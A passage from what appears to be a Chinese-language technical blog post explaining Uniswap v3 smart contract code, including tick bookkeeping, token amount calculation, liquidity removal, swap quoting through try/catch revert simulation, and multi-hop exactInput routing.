class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function update(</span><br><span class="line">    mapping(int24 =&gt; Tick.Info) storage self,</span><br><span class="line">    int24 tick,</span><br><span class="line">    int24 tickCurrent,</span><br><span class="line">    int128 liquidityDelta,</span><br><span class="line">    uint256 feeGrowthGlobal0X128,</span><br><span class="line">    uint256 feeGrowthGlobal1X128,</span><br><span class="line">    bool upper,</span><br><span class="line">    uint128 maxLiquidity</span><br><span class="line">) internal returns (bool flipped) &#123;</span><br><span class="line">    Tick.Info storage info = self[tick];</span><br><span class="line"></span><br><span class="line">    uint128 liquidityGrossBefore = info.liquidityGross;</span><br><span class="line">    uint128 liquidityGrossAfter = LiquidityMath.addDelta(liquidityGrossBefore, liquidityDelta);</span><br><span class="line"></span><br><span class="line">    require(liquidityGrossAfter &lt;= maxLiquidity, &#x27;LO&#x27;);</span><br><span class="line"></span><br><span class="line">    // 通过 liquidityGross 在进行 position 变化前后的值</span><br><span class="line">    // 来判断 tick 是否仍被引用</span><br><span class="line">    flipped = (liquidityGrossAfter == 0) != (liquidityGrossBefore == 0);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    info.liquidityGross = liquidityGrossAfter;</span><br><span class="line"></span><br><span class="line">    // 更新 liquidityNet 的值，对于 upper tick，</span><br><span class="line">    info.liquidityNet = upper</span><br><span class="line">        ? int256(info.liquidityNet).sub(liquidityDelta).toInt128()</span><br><span class="line">        : int256(info.liquidityNet).add(liquidityDelta).toInt128();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此函数返回的 flipped 表示此 tick 的引用状态是否发生变化，之前的 <code>_updatePosition</code> 中的代码会根据这个返回值去更新 tick 位图。</p><h4 id="tick-位图"><a href="#tick-位图" class="headerlink" title="tick 位图"></a>tick 位图</h4><p>tick位图穿插在大多数步骤，用于记录所有被引用的 lower/upper tick index，我们可以用过 tick 位图，从当前价格找到下一个（从左至右或者从右至左）被引用的 tick index。关于 tick 位图的管理，在 <code>_updatePosition</code> 中的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (flippedLower) &#123;</span><br><span class="line">    tickBitmap.flipTick(tickLower, tickSpacing);</span><br><span class="line">    secondsOutside.initialize(tickLower, tick, tickSpacing, blockTimestamp);</span><br><span class="line">&#125;</span><br><span class="line">if (flippedUpper) &#123;</span><br><span class="line">    tickBitmap.flipTick(tickUpper, tickSpacing);</span><br><span class="line">    secondsOutside.initialize(tickUpper, tick, tickSpacing, blockTimestamp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不做进一步的说明，具体代码实现在<a href="https://github.com/Uniswap/uniswap-v3-core/blob/2dc1eb9f251bad1c260d22dd392d8cedb2c6a4b5/contracts/libraries/TickBitmap.sol">TickBitmap库</a>中。tick 位图有以下几个特性：</p><ul><li>对于不存在的 tick，不需要初始值，因为访问 map 中不存在的 key 默认值就是 0</li><li>通过对位图的每个 word(uint256) 建立索引来管理位图，即访问路径为 word index -&gt; word -&gt; tick bit</li></ul><h4 id="所需token-数目计算"><a href="#所需token-数目计算" class="headerlink" title="所需token 数目计算"></a>所需token 数目计算</h4><p>步骤三的<code>mint()</code>调用了<code>_modifyPosition()</code>计算出此次提供流动性具体所需的 x token 和 y token 数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function _modifyPosition(ModifyPositionParams memory params)</span><br><span class="line">    private</span><br><span class="line">    noDelegateCall</span><br><span class="line">    returns (</span><br><span class="line">        Position.Info storage position,</span><br><span class="line">        int256 amount0,</span><br><span class="line">        int256 amount1</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    Slot0 memory _slot0 = slot0; // SLOAD for gas optimization</span><br><span class="line"></span><br><span class="line">    position = _updatePosition(</span><br><span class="line">        ...</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数在更新完 position 之后，主要做的就是通过<code>流动性</code>和<code>价格</code>计算出用户需要支付的 token 数量，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">function _modifyPosition(ModifyPositionParams memory params)</span><br><span class="line">    private</span><br><span class="line">    noDelegateCall</span><br><span class="line">    returns (</span><br><span class="line">        Position.Info storage position,</span><br><span class="line">        int256 amount0,</span><br><span class="line">        int256 amount1</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    if (params.liquidityDelta != 0) &#123;</span><br><span class="line">        // 计算三种情况下 amount0 和 amount1 的值，即 x token 和 y token 的数量</span><br><span class="line">        if (_slot0.tick &lt; params.tickLower) &#123;</span><br><span class="line">            amount0 = SqrtPriceMath.getAmount0Delta(</span><br><span class="line">                // 计算 lower/upper tick 对应的价格</span><br><span class="line">                TickMath.getSqrtRatioAtTick(params.tickLower),</span><br><span class="line">                TickMath.getSqrtRatioAtTick(params.tickUpper),</span><br><span class="line">                params.liquidityDelta</span><br><span class="line">            );</span><br><span class="line">        &#125; else if (_slot0.tick &lt; params.tickUpper) &#123;</span><br><span class="line">            // current tick is inside the passed range</span><br><span class="line">            uint128 liquidityBefore = liquidity; // SLOAD for gas optimization</span><br><span class="line"></span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            amount0 = SqrtPriceMath.getAmount0Delta(</span><br><span class="line">                _slot0.sqrtPriceX96,</span><br><span class="line">                TickMath.getSqrtRatioAtTick(params.tickUpper),</span><br><span class="line">                params.liquidityDelta</span><br><span class="line">            );</span><br><span class="line">            amount1 = SqrtPriceMath.getAmount1Delta(</span><br><span class="line">                TickMath.getSqrtRatioAtTick(params.tickLower),</span><br><span class="line">                _slot0.sqrtPriceX96,</span><br><span class="line">                params.liquidityDelta</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            liquidity = LiquidityMath.addDelta(liquidityBefore, params.liquidityDelta);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            amount1 = SqrtPriceMath.getAmount1Delta(</span><br><span class="line">                TickMath.getSqrtRatioAtTick(params.tickLower),</span><br><span class="line">                TickMath.getSqrtRatioAtTick(params.tickUpper),</span><br><span class="line">                params.liquidityDelta</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码将计算的过程封装在了 <code>SqrtPriceMath</code> 库中，<code>getAmount0Delta</code> 和 <code>getAmount1Delta</code> 分别对应公式 ：</p><p><img src="/2023/08/05/03.Uniswap/09.uniswap_v3_code/image-20230805161741766.png" alt="image-20230805161741766"></p><p>在具体的计算过程中，又分成了 RoundUp 和 RoundDown 两种情况，简单来说：</p><ol><li>当提供/增加流动性时，会使用 RoundUp，这样可以保证增加数量为 L 的流动性时，用户提供足够的 token 到 pool 中</li><li>当移除/减少流动性时，会使用 RoundDown，这样可以保证减少数量为 L 的流动性时，不会从 pool 中给用户多余的 token</li></ol><p>通过上述两个条件可以保证 pool 在流动性增加/移除的操作中，不会出现坏账的情况。除了流动性操作之外，swap 操作也会使用类似机制，保证 pool 不会出现坏账。</p><p>同时，Uniswap v3 参考<a href="https://xn--2-umb.com/21/muldiv/index.html">这里</a>实现了一个精度较高的 a * b  / c的算法，封装在 <code>FullMath</code> 库中。</p><h4 id="tick-index与价格"><a href="#tick-index与价格" class="headerlink" title="tick index与价格"></a>tick index与价格</h4><p>上面的代码还使用了 <code>TickMath</code> 库中的 <code>getSqrtRatioAtTick</code> 来通过 tick index 计算其所对应的价格，实现为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">function getSqrtRatioAtTick(int24 tick) internal pure returns (uint160 sqrtPriceX96) &#123;</span><br><span class="line">    uint256 absTick = tick &lt; 0 ? uint256(-int256(tick)) : uint256(int256(tick));</span><br><span class="line">    require(absTick &lt;= uint256(MAX_TICK), &#x27;T&#x27;);</span><br><span class="line"></span><br><span class="line">    // 这些魔数分别表示 1/sqrt(1.0001)^1, 1/sqrt(1.0001)^2, 1/sqrt(1.0001)^4....</span><br><span class="line">    uint256 ratio = absTick &amp; 0x1 != 0 ? 0xfffcb933bd6fad37aa2d162d1a594001 : 0x100000000000000000000000000000000;</span><br><span class="line">    if (absTick &amp; 0x2 != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x4 != 0) ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x8 != 0) ratio = (ratio * 0xffe5caca7e10e4e61c3624eaa0941cd0) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x10 != 0) ratio = (ratio * 0xffcb9843d60f6159c9db58835c926644) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x20 != 0) ratio = (ratio * 0xff973b41fa98c081472e6896dfb254c0) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x40 != 0) ratio = (ratio * 0xff2ea16466c96a3843ec78b326b52861) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x80 != 0) ratio = (ratio * 0xfe5dee046a99a2a811c461f1969c3053) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x100 != 0) ratio = (ratio * 0xfcbe86c7900a88aedcffc83b479aa3a4) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x200 != 0) ratio = (ratio * 0xf987a7253ac413176f2b074cf7815e54) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x400 != 0) ratio = (ratio * 0xf3392b0822b70005940c7a398e4b70f3) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x800 != 0) ratio = (ratio * 0xe7159475a2c29b7443b29c7fa6e889d9) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x1000 != 0) ratio = (ratio * 0xd097f3bdfd2022b8845ad8f792aa5825) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x2000 != 0) ratio = (ratio * 0xa9f746462d870fdf8a65dc1f90e061e5) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x4000 != 0) ratio = (ratio * 0x70d869a156d2a1b890bb3df62baf32f7) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x8000 != 0) ratio = (ratio * 0x31be135f97d08fd981231505542fcfa6) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x10000 != 0) ratio = (ratio * 0x9aa508b5b7a84e1c677de54f3e99bc9) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x20000 != 0) ratio = (ratio * 0x5d6af8dedb81196699c329225ee604) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x40000 != 0) ratio = (ratio * 0x2216e584f5fa1ea926041bedfe98) &gt;&gt; 128;</span><br><span class="line">    if (absTick &amp; 0x80000 != 0) ratio = (ratio * 0x48a170391f7dc42444e8fa2) &gt;&gt; 128;</span><br><span class="line"></span><br><span class="line">    if (tick &gt; 0) ratio = type(uint256).max / ratio;</span><br><span class="line"></span><br><span class="line">    // this divides by 1&lt;&lt;32 rounding up to go from a Q128.128 to a Q128.96.</span><br><span class="line">    // we then downcast because we know the result always fits within 160 bits due to our tick input constraint</span><br><span class="line">    // we round up in the division so getTickAtSqrtRatio of the output price is always consistent</span><br><span class="line">    sqrtPriceX96 = uint160((ratio &gt;&gt; 32) + (ratio % (1 &lt;&lt; 32) == 0 ? 0 : 1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/05/03.Uniswap/09.uniswap_v3_code/image-20230805162143571.png" alt="image-20230805162143571"></p><h2 id="移除流动性"><a href="#移除流动性" class="headerlink" title="移除流动性"></a>移除流动性</h2><p>是提供流动性的逆操作，在core合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function burn(</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    uint128 amount</span><br><span class="line">) external override lock returns (uint256 amount0, uint256 amount1) &#123;</span><br><span class="line">    // 先计算出需要移除的 token 数</span><br><span class="line">    (Position.Info storage position, int256 amount0Int, int256 amount1Int) =</span><br><span class="line">        _modifyPosition(</span><br><span class="line">            ModifyPositionParams(&#123;</span><br><span class="line">                owner: msg.sender,</span><br><span class="line">                tickLower: tickLower,</span><br><span class="line">                tickUpper: tickUpper,</span><br><span class="line">                liquidityDelta: -int256(amount).toInt128()</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    amount0 = uint256(-amount0Int);</span><br><span class="line">    amount1 = uint256(-amount1Int);</span><br><span class="line"></span><br><span class="line">    // 注意这里，移除流动性后，将移出的 token 数记录到了 position.tokensOwed 上</span><br><span class="line">    if (amount0 &gt; 0 || amount1 &gt; 0) &#123;</span><br><span class="line">        (position.tokensOwed0, position.tokensOwed1) = (</span><br><span class="line">            position.tokensOwed0 + uint128(amount0),</span><br><span class="line">            position.tokensOwed1 + uint128(amount1)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit Burn(msg.sender, tickLower, tickUpper, amount, amount0, amount1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>移除流动性时，还是使用之前的公式计算出移出的 token 数，但是并不会直接将移出的 token 数发送给用户，而是记录在了 position 的 <code>tokensOwed0</code> 和 <code>tokensOwed1</code> 上</p><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><p>v3 的 <code>UniswapV3Pool</code> 提供了比较底层的交易接口，而在 <code>SwapRouter</code> 合约中封装了面向用户的交易接口：</p><ul><li><code>exactInput</code>：指定交易对路径，付出的 x token 数和预期得到的最小 y token 数（x, y 可以互换）</li><li><code>exactOutput</code>：指定交易路径，付出的 x token 最大数和预期得到的 y token 数（x, y 可以互换）</li></ul><p>这里我们讲解 <code>exactInput</code> 这个接口，调用流程如下：</p><p><img src="/2023/08/05/03.Uniswap/09.uniswap_v3_code/image-20230805164213621.png" alt="image-20230805164213621"></p><h3 id="路径选择"><a href="#路径选择" class="headerlink" title="路径选择"></a>路径选择</h3><p>在进行两个代币交易时，是首先需要在链下计算出交易的路径，例如使用 <code>ETH</code> -&gt; <code>DAI</code> ：</p><ul><li>可以直接通过 <code>ETH/DAI</code> 的交易池完成</li><li>也可以通过 <code>ETH</code> -&gt; <code>USDC</code> -&gt; <code>DAI</code> 路径，即经过 <code>ETH/USDC</code>, <code>USDC/DAI</code> 两个交易池完成交易</li></ul><p>Uniswap 的前端会帮用户实时计算出最优路径（即交易的收益最高），作为参数传给合约调用。前端中这部分计算的具体实现在<a href="https://github.com/Uniswap/uniswap-interface/blob/3aa045303a4aeefe4067688e3916ecf36b2f7f75/src/hooks/useBestV3Trade.ts#L17-L96">这里</a>，具体过程为先用需要交易的输入代币，输出代币，以及一系列可用的中间代币（代码中叫 Base token）生成所有的路径（当然为了降低复杂度，路径中最多包含3个代币），然后遍历每个路径输出的输出代币数量，最后选取最佳路径。</p><p>事实上因为 v3 引入了费率的原因，在路径选择的过程中还需要考虑费率的因素</p><h3 id="交易预计算"><a href="#交易预计算" class="headerlink" title="交易预计算"></a>交易预计算</h3><p>当用户和 uniswap 前端进行交互时，前端需要预先计算出用户输入 token 能够预期得到的 token 数量。</p><p>这个功能在 uniswap v2 有非常简单的<a href="https://github.com/Uniswap/uniswap-v2-periphery/blob/dda62473e2da448bc9cb8f4514dadda4aeede5f4/contracts/libraries/UniswapV2Library.sol#L42-L59">实现</a>，只需要查询处合约中两个代币的余额就可以完成预计算。</p><p>但是在 v3 版本中，由于交易的计算需要使用合约内的 tick 信息，预计算只能由 uniswap v3 pool 合约来完成，但是 pool 合约中的计算函数都是会更改合约状态的 <code>external</code> 函数，那么如何把这个函数当作 <code>view/pure</code> 函数来使用呢？uniswap v3 periphery 仓库中给出了一个非常 tricky 的实现，代码在 <code>contracts/lens/Quoter.sol</code> 中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function quoteExactInputSingle(</span><br><span class="line">    address tokenIn,</span><br><span class="line">    address tokenOut,</span><br><span class="line">    uint24 fee,</span><br><span class="line">    uint256 amountIn,</span><br><span class="line">    uint160 sqrtPriceLimitX96</span><br><span class="line">) public override returns (uint256 amountOut) &#123;</span><br><span class="line">    bool zeroForOne = tokenIn &lt; tokenOut;</span><br><span class="line"></span><br><span class="line">    try</span><br><span class="line">        getPool(tokenIn, tokenOut, fee).swap(  // 调用 pool 合约的 swap 接口来模拟一次真实的交易</span><br><span class="line">            address(this), // address(0) might cause issues with some tokens</span><br><span class="line">            zeroForOne,</span><br><span class="line">            amountIn.toInt256(),</span><br><span class="line">            sqrtPriceLimitX96 == 0</span><br><span class="line">                ? (zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)</span><br><span class="line">                : sqrtPriceLimitX96,</span><br><span class="line">            abi.encodePacked(tokenIn, fee, tokenOut)</span><br><span class="line">        )</span><br><span class="line">    &#123;&#125; catch (bytes memory reason) &#123;</span><br><span class="line">        return parseRevertReason(reason);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到函数中调用了 <code>getPool(tokenIn, tokenOut, fee).swap()</code>，即 pool 合约的真实交易函数，但是实际上我们并不想让交易发生，这个交易调用必定也会失败，因此合约使用了 <code>try/catch</code> 的方式捕获错误，并且在回调函数中获取到模拟交易的结果，存入内存中。</p><p>可以看回调函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function uniswapV3SwapCallback(</span><br><span class="line">    int256 amount0Delta,</span><br><span class="line">    int256 amount1Delta,</span><br><span class="line">    bytes memory path</span><br><span class="line">) external view override &#123;</span><br><span class="line">    require(amount0Delta &gt; 0 || amount1Delta &gt; 0); // swaps entirely within 0-liquidity regions are not supported</span><br><span class="line">    (address tokenIn, address tokenOut, uint24 fee) = path.decodeFirstPool();</span><br><span class="line">    CallbackValidation.verifyCallback(factory, tokenIn, tokenOut, fee);</span><br><span class="line"></span><br><span class="line">    (bool isExactInput, uint256 amountToPay, uint256 amountReceived) =</span><br><span class="line">        amount0Delta &gt; 0</span><br><span class="line">            ? (tokenIn &lt; tokenOut, uint256(amount0Delta), uint256(-amount1Delta))</span><br><span class="line">            : (tokenOut &lt; tokenIn, uint256(amount1Delta), uint256(-amount0Delta));</span><br><span class="line">    if (isExactInput) &#123;</span><br><span class="line">        assembly &#123;  // 这里代码需要将结果保存在内存中</span><br><span class="line">            let ptr := mload(0x40)  // 0x40 是 solidity 定义的 free memory pointer</span><br><span class="line">            mstore(ptr, amountReceived) // 将结果保存起来</span><br><span class="line">            revert(ptr, 32) // revert 掉交易，并将内存中的数据作为 revert data</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // if the cache has been populated, ensure that the full output amount has been received</span><br><span class="line">        if (amountOutCached != 0) require(amountReceived == amountOutCached);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            let ptr := mload(0x40)</span><br><span class="line">            mstore(ptr, amountToPay)</span><br><span class="line">            revert(ptr, 32)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个回调函数主要的作用就是将 <code>swap()</code> 函数计算处的结果保存到内存中，这里使用了 assembly 来访问 solidity 的 free memory pointer，关于 solidity 内存布局，可以参考文档：<a href="https://docs.soliditylang.org/en/latest/internals/layout_in_memory.html">Layout in Memory</a>.</p><p>将结果保存到内存中时候就将交易 <code>revert</code> 掉，然后在 <code>quoteExactInputSingle</code> 中捕获这个错误，并将内存中的信息读取出来，返回给调用者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/// @dev Parses a revert reason that should contain the numeric quote</span><br><span class="line">function parseRevertReason(bytes memory reason) private pure returns (uint256) &#123;</span><br><span class="line">    if (reason.length != 32) &#123; // swap 函数正常 revert 的情况</span><br><span class="line">        if (reason.length &lt; 68) revert(&#x27;Unexpected error&#x27;);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            reason := add(reason, 0x04)</span><br><span class="line">        &#125;</span><br><span class="line">        revert(abi.decode(reason, (string)));</span><br><span class="line">    &#125;</span><br><span class="line">    return abi.decode(reason, (uint256)); // 这里捕获前面回调函数保存在内存中的结果。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：通过 <code>try/catch</code> 结合回调函数，模拟计算结果，实现了交易预计算的功能，这样 uniswap 前端就能够在获取用户输入后进行交易的预计算了，这部分前端的实现在<a href="https://github.com/Uniswap/uniswap-interface/blob/3aa045303a4aeefe4067688e3916ecf36b2f7f75/src/hooks/useBestV3Trade.ts#L36">这里</a>。</p><h3 id="交易入口"><a href="#交易入口" class="headerlink" title="交易入口"></a>交易入口</h3><p>交易的入口函数是 <code>exactInput</code> 函数，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">struct ExactInputParams &#123;</span><br><span class="line">    bytes path;                 // 路径</span><br><span class="line">    address recipient;          // 收款地址</span><br><span class="line">    uint256 deadline;           // 交易有效期</span><br><span class="line">    uint256 amountIn;           // 输入的 token 数（输入的 token 地址就是 path 中的第一个地址）</span><br><span class="line">    uint256 amountOutMinimum;   // 预期交易最少获得的 token 数（获得的 token 地址就是 path 中最后一个地址）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function exactInput(ExactInputParams memory params)</span><br><span class="line">    external</span><br><span class="line">    payable</span><br><span class="line">    override</span><br><span class="line">    checkDeadline(params.deadline)</span><br><span class="line">    returns (uint256 amountOut)</span><br><span class="line">&#123;</span><br><span class="line">    // 通过循环，遍历传入的路径，进行交易</span><br><span class="line">    while (true) &#123;</span><br><span class="line">        bool hasPools = params.path.hasPools();</span><br><span class="line"></span><br><span class="line">        // 完成当前路径的交易</span><br><span class="line">        params.amountIn = exactInputSingle(</span><br><span class="line">            params.amountIn,</span><br><span class="line">            // 如果是中间交易，又合约代为收取和支付中间代币</span><br><span class="line">            hasPools ? address(this) : params.recipient,</span><br><span class="line">            // 给回调函数用的参数</span><br><span class="line">            SwapData(&#123;</span><br><span class="line">                path: params.path.getFirstPool(),</span><br><span class="line">                payer: msg.sender</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 如果路径全部遍历完成，则退出循环，交易完成</span><br><span class="line">        if (hasPools) &#123;</span><br><span class="line">            // 步进 path 中的值</span><br><span class="line">            params.path = params.path.skipToken();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            amountOut = params.amountIn;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 检查交易是否满足预期</span><br><span class="line">    require(amountOut &gt;= params.amountOutMinimum, &#x27;Too little received&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用一个循环遍历传入的路径，路径中包含了交易过程中所有的 token，每相邻的两个 token 组成了一个交易对。例如当需要通过 <code>ETH</code> -&gt; <code>USDC</code> -&gt; <code>DAI</code> 路径进行交易时，会经过两个池：<code>ETH/USDC</code> 和 <code>USDC/DAI</code>，最终得到 <code>DAI</code> 代币。如前所述，这里其实还包含了每个交易对所选择的费率。</p><h3 id="路径编码-解码"><a href="#路径编码-解码" class="headerlink" 